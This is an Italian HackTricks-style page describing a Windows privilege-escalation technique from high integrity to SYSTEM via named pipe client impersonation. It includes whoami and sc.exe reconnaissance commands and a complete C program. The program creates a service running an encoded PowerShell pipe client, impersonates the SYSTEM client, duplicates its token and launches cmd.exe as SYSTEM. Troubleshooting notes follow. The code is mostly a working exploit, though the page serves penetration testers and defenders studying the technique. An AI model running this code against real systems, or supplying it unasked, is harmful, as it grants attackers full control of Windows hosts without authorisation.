# Da High Integrity a SYSTEM con Name Pipes

{{#include ../../banners/hacktricks-training.md}}

Questa è la variante **administrator/SCM** dell'impersonificazione tramite named pipe: un processo con privilegi elevati crea un servizio temporaneo il cui processo figlio si connette come `SYSTEM`, quindi impersona quel client. Se il contesto iniziale non può creare servizi ma dispone di `SeImpersonatePrivilege`, usa invece una coercizione tramite servizio privilegiato; consulta [Named Pipe Client Impersonation](named-pipe-client-impersonation.md) e [RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato](roguepotato-and-printspoofer.md). La creazione del servizio richiede l'accesso all'SCM e l'accesso `SERVICE_START` al nuovo servizio, mentre `CreateProcessWithTokenW` richiede `SeImpersonatePrivilege`.<sup>[[2]](#references)[[3]](#references)</sup>

Conferma rapidamente il contesto iniziale previsto:
```cmd
whoami /groups | findstr /i "High Mandatory"
whoami /priv | findstr /i "SeImpersonatePrivilege"
sc.exe query PiperSrv
```
**Flusso del codice:**

1. Crea il named pipe server **prima** di avviare il service. Durante l'attesa, considera il ritorno di `ConnectNamedPipe` come `FALSE` con `ERROR_PIPE_CONNECTED` un successo: significa che il client ha vinto la race e si è connesso tra `CreateNamedPipe` e `ConnectNamedPipe`.<sup>[[4]](#references)</sup>
2. Crea e avvia un service che si connetterà al pipe creato e scriverà qualcosa. Il codice del service eseguirà questo codice PS codificato: `$pipe = new-object System.IO.Pipes.NamedPipeClientStream("piper"); $pipe.Connect(); $sw = new-object System.IO.StreamWriter($pipe); $sw.WriteLine("Go"); $sw.Dispose();`
3. Dopo che il service si è connesso e ha scritto, chiama `ImpersonateNamedPipeClient`, apri il thread token risultante e duplicalo come primary token.<sup>[[1]](#references)</sup>
4. Usa quel primary token per avviare `cmd.exe`.<sup>[[2]](#references)</sup>

Questo percorso presuppone che il chiamante possa creare/avviare un service e disponga dei privilegi richiesti da `CreateProcessWithTokenW` (normalmente `SeImpersonatePrivilege`). È una tecnica high-integrity-to-SYSTEM, non una primitive disponibile per un utente arbitrario con privilegi ridotti.<sup>[[2]](#references)[[3]](#references)</sup>

> [!WARNING]
> Se la creazione o l'avvio del service fallisce, l'esempio non invia un segnale al pipe thread e può rimanere in attesa indefinitamente. Aggiungi la gestione degli errori e un timeout per un pipe overlapped prima di utilizzarlo al di fuori di un lab. Usa inoltre un nome casuale per pipe/service per evitare collisioni.

`ImpersonateNamedPipeClient` adotta il contesto associato all'**ultimo messaggio letto**, quindi una semplice connessione non è sufficiente: fai in modo che il client privilegiato scriva, verifica che `ReadFile` abbia restituito dei dati e solo dopo esegui l'impersonation. Duplica il thread impersonation token in un token `TokenPrimary` con `SecurityImpersonation`; un primary token è ciò che l'API di creazione dei processi utilizza.<sup>[[1]](#references)[[5]](#references)</sup>
```c
#include <windows.h>
#include <time.h>

#pragma comment (lib, "advapi32")
#pragma comment (lib, "kernel32")

#define PIPESRV "PiperSrv"
#define MESSAGE_SIZE 512

DWORD WINAPI ServiceGo(LPVOID lpParam) {

SC_HANDLE scManager;
SC_HANDLE scService;

scManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);

if (scManager == NULL) {
return FALSE;
}

// create Piper service
scService = CreateServiceA(scManager, PIPESRV, PIPESRV, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
"C:\\Windows\\System32\\cmd.exe /c powershell.exe -EncodedCommand JABwAGkAcABlACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFAAaQBwAGUAcwAuAE4AYQBtAGUAZABQAGkAcABlAEMAbABpAGUAbgB0AFMAdAByAGUAYQBtACgAIgBwAGkAcABlAHIAIgApADsAIAAkAHAAaQBwAGUALgBDAG8AbgBuAGUAYwB0ACgAKQA7ACAAJABzAHcAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHAAaQBwAGUAKQA7ACAAJABzAHcALgBXAHIAaQB0AGUATABpAG4AZQAoACIARwBvACIAKQA7ACAAJABzAHcALgBEAGkAcwBwAG8AcwBlACgAKQA7AA==",
NULL, NULL, NULL, NULL, NULL);

if (scService == NULL) {
//printf("[!] CreateServiceA() failed: [%d]\n", GetLastError());
return FALSE;
}

// launch it
StartService(scService, 0, NULL);

// wait a bit and then cleanup
Sleep(10000);
DeleteService(scService);

CloseServiceHandle(scService);
CloseServiceHandle(scManager);
}

int main() {

LPCSTR sPipeName = "\\\\.\\pipe\\piper";
HANDLE hSrvPipe;
HANDLE th;
BOOL bPipeConn;
char pPipeBuf[MESSAGE_SIZE];
DWORD dBRead = 0;

HANDLE hImpToken;
HANDLE hNewToken;
STARTUPINFOW si;
PROCESS_INFORMATION pi;

// open pipe
hSrvPipe = CreateNamedPipeA(sPipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT,
PIPE_UNLIMITED_INSTANCES, 1024, 1024, 0, NULL);

// create and run service
th = CreateThread(0, 0, ServiceGo, NULL, 0, 0);

// wait for the connection from the service
bPipeConn = ConnectNamedPipe(hSrvPipe, NULL);
if (!bPipeConn && GetLastError() == ERROR_PIPE_CONNECTED) {
bPipeConn = TRUE; // Client connected between CreateNamedPipe and ConnectNamedPipe
}
if (bPipeConn) {
if (!ReadFile(hSrvPipe, &pPipeBuf, MESSAGE_SIZE, &dBRead, NULL) || dBRead == 0) {
return -6;
}

// impersonate the service (SYSTEM)
if (ImpersonateNamedPipeClient(hSrvPipe) == 0) {
return -1;
}

// wait for the service to cleanup
WaitForSingleObject(th, INFINITE);

// get a handle to impersonated token
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hImpToken)) {
return -2;
}

// create new primary token for new process
if (!DuplicateTokenEx(hImpToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,
TokenPrimary, &hNewToken)) {
return -4;
}

//Sleep(20000);
// spawn cmd.exe as full SYSTEM user
ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));
if (!CreateProcessWithTokenW(hNewToken, 0, L"C:\\Windows\\System32\\cmd.exe", NULL,
CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
return -5;
}

// revert back to original security context
RevertToSelf();

}

return 0;
}
```
### Triage degli errori

- `ConnectNamedPipe == FALSE` con `ERROR_PIPE_CONNECTED`: continua; la pipe è già connessa.<sup>[[4]](#references)</sup>
- `ImpersonateNamedPipeClient` non riesce con `ERROR_CANNOT_IMPERSONATE` (`1368`): verifica che il client SYSTEM abbia effettivamente scritto i dati e che `ReadFile` sia completato. Controlla anche il livello di impersonation richiesto dal client; i client con livello identification/anonymous non possono essere completamente impersonati.<sup>[[1]](#references)</sup>
- `CreateProcessWithTokenW` non riesce con `ERROR_PRIVILEGE_NOT_HELD` (`1314`): il chiamante originale non possiede `SeImpersonatePrivilege`. Da un contesto administrator con high-integrity, usa il percorso token-copy documentato in [SeImpersonate from High To System](seimpersonate-from-high-to-system.md), oppure usa `CreateProcessAsUserW` mentre impersoni SYSTEM, se sono presenti i privilegi richiesti.<sup>[[2]](#references)</sup>
- `CreateServiceA` restituisce `ERROR_SERVICE_EXISTS` (`1073`): elimina la voce `PiperSrv` obsoleta o rendi casuale `PIPESRV`; elimina sempre il servizio temporaneo dopo il trigger.<sup>[[3]](#references)</sup>



## References

- [1] [Microsoft Learn — `ImpersonateNamedPipeClient`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [Microsoft Learn — `CreateProcessWithTokenW`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [3] [Microsoft Learn — `CreateServiceA`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
- [4] [Microsoft Learn — `ConnectNamedPipe`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe)
- [5] [Microsoft Learn — `DuplicateTokenEx`](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex)
{{#include ../../banners/hacktricks-training.md}}
